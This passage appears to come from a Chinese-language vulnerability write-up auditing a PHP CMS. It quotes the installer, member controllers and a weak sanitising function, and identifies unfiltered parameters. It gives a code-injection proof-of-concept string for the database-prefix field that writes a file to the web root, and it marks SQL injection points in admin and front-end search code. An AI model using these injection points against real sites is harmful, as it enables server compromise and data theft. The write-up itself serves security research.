</span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>menu_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>init</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 导入默认数据
</span></span></span><span style=display:flex><span>                    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_query</span>(<span style=color:#a6e22e>str_replace</span>(
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;{dbprefix}&#39;</span>, <span style=color:#e6db74>&#39;{site_url}&#39;</span>),
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dbprefix</span>, <span style=color:#e6db74>&#39;http://&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>strtolower</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_HOST&#39;</span>])),
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install/default.sql&#39;</span>)
</span></span><span style=display:flex><span>                    ));
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>1</span>, <span style=color:#a6e22e>dr_url</span>(<span style=color:#e6db74>&#39;install/index&#39;</span>, <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;step&#39;</span> <span style=color:#f92672>=&gt;</span> $step <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>))));
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                $log <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>                $sql <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install/install.sql&#39;</span>);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>preg_match_all</span>(<span style=color:#e6db74>&#39;/`\{dbprefix\}(.+)`/U&#39;</span>, $sql, $match);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ($match) {
</span></span><span style=display:flex><span>                    $log <span style=color:#f92672>=</span> <span style=color:#a6e22e>array_unique</span>($match[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>assign</span>(<span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;log&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;&lt;finecms&gt;&#39;</span>, $log),
</span></span><span style=display:flex><span>                ));
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>5</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install.lock&#39;</span>, <span style=color:#a6e22e>time</span>());
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#a6e22e>WEBPATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;cache/install.new&#39;</span>, <span style=color:#a6e22e>time</span>());
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>assign</span>(<span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;step&#39;</span> <span style=color:#f92672>=&gt;</span> $step,
</span></span><span style=display:flex><span>        ));
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>display</span>(<span style=color:#e6db74>&#39;install_&#39;</span><span style=color:#f92672>.</span>$step<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;.html&#39;</span>, <span style=color:#e6db74>&#39;admin&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>然后定位到<code>$data['dbprefix']</code>是可控的，也就是数据库的表前缀，前面的数据库配置文件内容以及交代清楚，接下来构造一个POC：
<code>','x'=>file_put_contents('s.txt','ss'),'b'=>'b</code></p><p><a href=https://images.payloads.online/e3a04450-4f5e-11ec-acd7-00d861bf4abb.jpg data-fancybox=gallery data-caption=POC><img src=https://images.payloads.online/e3a04450-4f5e-11ec-acd7-00d861bf4abb.jpg alt=POC></a></p><p>这个POC是在数组中的，会在网站根目录新建一个<code>s.txt</code>内容为<code>ss</code>，在PHP的数组里，你可以放eval等字符，但是这个<code>database.php</code>是不能直接访问的，因为<code>if (!defined('BASEPATH')) exit('No direct script access allowed');</code>这一句是判断是否是框架初始化后加载此文件，否则就不再继续向下运行，好像这种思路都是框架常用的办法。</p><h2 id=0x02-后台sql注入>0x02 后台SQL注入</h2><p>第二处是在后台的某处搜索上，这个Input是一个日期输入框，但是不是原生的Input。</p><p><a href=https://images.payloads.online/e3ea4df2-4f5e-11ec-b551-00d861bf4abb.jpg data-fancybox=gallery data-caption=DATE><img src=https://images.payloads.online/e3ea4df2-4f5e-11ec-b551-00d861bf4abb.jpg alt=DATE></a></p><p>我们抓包看看请求：</p><p><a href=https://images.payloads.online/e442cfea-4f5e-11ec-ac86-00d861bf4abb.jpg data-fancybox=gallery data-caption=Request><img src=https://images.payloads.online/e442cfea-4f5e-11ec-ac86-00d861bf4abb.jpg alt=Request></a></p><p>控制器文件位于：<code>diy\module\member\controllers\admin\Home.php</code></p><p><a href=https://images.payloads.online/e48b9928-4f5e-11ec-8954-00d861bf4abb.jpg data-fancybox=gallery data-caption=Controller><img src=https://images.payloads.online/e48b9928-4f5e-11ec-8954-00d861bf4abb.jpg alt=Controller></a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * 经验值
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>experience</span>() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_experience</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $uid <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;uid&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>print_r</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 根据参数筛选结果
</span></span></span><span style=display:flex><span>        $param <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;uid&#39;</span> <span style=color:#f92672>=&gt;</span> $uid, <span style=color:#e6db74>&#39;type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;search&#39;</span>) <span style=color:#f92672>&amp;&amp;</span> $param[<span style=color:#e6db74>&#39;search&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 数据库中分页查询
</span></span></span><span style=display:flex><span>        <span style=color:#66d9ef>list</span>($data, $param) <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>score_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>limit_page</span>($param, <span style=color:#a6e22e>max</span>((<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;page&#39;</span>), <span style=color:#ae81ff>1</span>), (<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;total&#39;</span>));
</span></span><span style=display:flex><span>        $param[<span style=color:#e6db74>&#39;uid&#39;</span>] <span style=color:#f92672>=</span> $uid;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $_param <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;search&#39;</span>) <span style=color:#f92672>?</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>score_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_file</span>) <span style=color:#f92672>:</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;data&#39;</span>);
</span></span><span style=display:flex><span>        $_param <span style=color:#f92672>=</span> $_param <span style=color:#f92672>?</span> $param <span style=color:#f92672>+</span> $_param <span style=color:#f92672>:</span> $param;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>assign</span>(<span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;list&#39;</span> <span style=color:#f92672>=&gt;</span> $data,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;name&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#a6e22e>SITE_EXPERIENCE</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;param&#39;</span> <span style=color:#f92672>=&gt;</span> $_param,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;pages&#39;</span> <span style=color:#f92672>=&gt;</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_pagination</span>(<span style=color:#a6e22e>dr_url</span>(<span style=color:#e6db74>&#39;member/home/experience&#39;</span>, $param), $param[<span style=color:#e6db74>&#39;total&#39;</span>])
</span></span><span style=display:flex><span>        ));
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>display</span>(<span style=color:#e6db74>&#39;score_index.html&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>Model文件：<code>diy\module\member\models\Score_model.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>   * 条件查询
</span></span></span><span style=display:flex><span><span style=color:#75715e>   *
</span></span></span><span style=display:flex><span><span style=color:#75715e>   * @param object  $select 查询对象
</span></span></span><span style=display:flex><span><span style=color:#75715e>   * @param array $param  条件参数
</span></span></span><span style=display:flex><span><span style=color:#75715e>   * @return  array 
</span></span></span><span style=display:flex><span><span style=color:#75715e>   */</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_where</span>(<span style=color:#f92672>&amp;</span>$select, $param) {
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    $_param <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_file</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>md5</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>duri</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>uri</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>uid</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SITE_ID</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ip_address</span>()<span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>user_agent</span>()); <span style=color:#75715e>// 缓存文件名称
</span></span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 存在POST提交时，重新生成缓存文件
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>IS_POST</span>) {
</span></span><span style=display:flex><span>      $data <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;data&#39;</span>); <span style=color:#75715e>//这里就没有过滤
</span></span></span><span style=display:flex><span>      $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>save</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_file</span>, $data, <span style=color:#ae81ff>3600</span>);
</span></span><span style=display:flex><span>      $param[<span style=color:#e6db74>&#39;search&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 存在search参数时，读取缓存文件
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($param[<span style=color:#e6db74>&#39;search&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>      $data <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>cache_file</span>);
</span></span><span style=display:flex><span>      $_param[<span style=color:#e6db74>&#39;search&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>isset</span>($data[<span style=color:#e6db74>&#39;start&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> $data[<span style=color:#e6db74>&#39;start&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> $data[<span style=color:#e6db74>&#39;start&#39;</span>] <span style=color:#f92672>!=</span> $data[<span style=color:#e6db74>&#39;end&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> $select<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>where</span>(<span style=color:#e6db74>&#39;inputtime BETWEEN &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;start&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; AND &#39;</span><span style=color:#f92672>.</span> $data[<span style=color:#e6db74>&#39;end&#39;</span>]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    $select<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>where</span>(<span style=color:#e6db74>&#39;type&#39;</span>, $param[<span style=color:#e6db74>&#39;type&#39;</span>]);
</span></span><span style=display:flex><span>    $select<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>where</span>(<span style=color:#e6db74>&#39;uid&#39;</span>, $param[<span style=color:#e6db74>&#39;uid&#39;</span>]);
</span></span><span style=display:flex><span>    $_param[<span style=color:#e6db74>&#39;uid&#39;</span>] <span style=color:#f92672>=</span> $data[<span style=color:#e6db74>&#39;uid&#39;</span>];
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $_param;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>故此出现了一个注入点：</p><p><a href=https://images.payloads.online/e4d0fd1a-4f5e-11ec-89c6-00d861bf4abb.jpg data-fancybox=gallery data-caption="SQL Injection"><img src=https://images.payloads.online/e4d0fd1a-4f5e-11ec-89c6-00d861bf4abb.jpg alt="SQL Injection"></a></p><h2 id=0x03-前台sql注入>0x03 前台SQL注入</h2><p>文件位置：<code>diy\module\member\controllers\Account.php</code>，约：757行左右，出现一处变量未过滤的情况。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * 附件管理
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>attachment</span>() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>dr_safe_replace</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;ext&#39;</span>));
</span></span><span style=display:flex><span>        $table <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;module&#39;</span>); <span style=color:#75715e>// 这个变量没有过滤
</span></span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>model</span>(<span style=color:#e6db74>&#39;attachment_model&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $page <span style=color:#f92672>=</span> <span style=color:#a6e22e>max</span>((<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;page&#39;</span>), <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 检测可管理的模块
</span></span></span><span style=display:flex><span>        $module <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>        $modules <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_cache</span>(<span style=color:#e6db74>&#39;module&#39;</span>, <span style=color:#a6e22e>SITE_ID</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($modules) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>foreach</span> ($modules <span style=color:#66d9ef>as</span> $dir) {
</span></span><span style=display:flex><span>                $mod <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_cache</span>(<span style=color:#e6db74>&#39;module-&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SITE_ID</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>.</span>$dir);
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_module_post_catid</span>($mod, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>markrule</span>) <span style=color:#f92672>&amp;&amp;</span> $module[$dir] <span style=color:#f92672>=</span> $mod[<span style=color:#e6db74>&#39;name&#39;</span>];
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 查询结果
</span></span></span><span style=display:flex><span>        <span style=color:#66d9ef>list</span>($total, $data) <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>attachment_model</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>limit</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>uid</span>, $page, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>pagesize</span>, $ext, $table);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        $acount <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_cache</span>(<span style=color:#e6db74>&#39;member&#39;</span>, <span style=color:#e6db74>&#39;setting&#39;</span>, <span style=color:#e6db74>&#39;permission&#39;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>markrule</span>, <span style=color:#e6db74>&#39;attachsize&#39;</span>);
</span></span><span style=display:flex><span>        $acount <span style=color:#f92672>=</span> $acount <span style=color:#f92672>?</span> $acount <span style=color:#f92672>:</span> <span style=color:#ae81ff>1024000</span>;
</span></span><span style=display:flex><span>        $ucount <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>select</span>(<span style=color:#e6db74>&#39;sum(`filesize`) as total&#39;</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>where</span>(<span style=color:#e6db74>&#39;uid&#39;</span>, (<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>uid</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>limit</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;attachment&#39;</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>row_array</span>();
</span></span><span style=display:flex><span>        $ucount <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$ucount[<span style=color:#e6db74>&#39;total&#39;</span>];
</span></span><span style=display:flex><span>        $acount <span style=color:#f92672>=</span> $acount <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span>;
</span></span><span style=display:flex><span>        $scount <span style=color:#f92672>=</span> <span style=color:#a6e22e>max</span>($acount <span style=color:#f92672>-</span> $ucount, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>assign</span>(<span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;ext&#39;</span> <span style=color:#f92672>=&gt;</span> $ext,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;list&#39;</span> <span style=color:#f92672>=&gt;</span> $data,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;table&#39;</span> <span style=color:#f92672>=&gt;</span> $table,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;module&#39;</span> <span style=color:#f92672>=&gt;</span> $module,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;acount&#39;</span> <span style=color:#f92672>=&gt;</span> $acount,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;ucount&#39;</span> <span style=color:#f92672>=&gt;</span> $ucount,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;scount&#39;</span> <span style=color:#f92672>=&gt;</span> $scount,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;pages&#39;</span> <span style=color:#f92672>=&gt;</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get_member_pagination</span>(<span style=color:#a6e22e>dr_member_url</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>router</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>router</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>method</span>, <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;ext&#39;</span> <span style=color:#f92672>=&gt;</span> $ext)), $total),
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;page_total&#39;</span> <span style=color:#f92672>=&gt;</span> $total,
</span></span><span style=display:flex><span>        ));
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>display</span>(<span style=color:#e6db74>&#39;account_attachment_list.html&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><code>dr_safe_replace</code>函数：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * 安全过滤函数
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @param $string
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @return string
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dr_safe_replace</span>($string) {
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;%20&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;%27&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;%2527&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;*&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;&amp;quot;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;&#39;&#34;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, $string);
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;&lt;&#39;</span>, <span style=color:#e6db74>&#39;&amp;lt;&#39;</span>, $string);
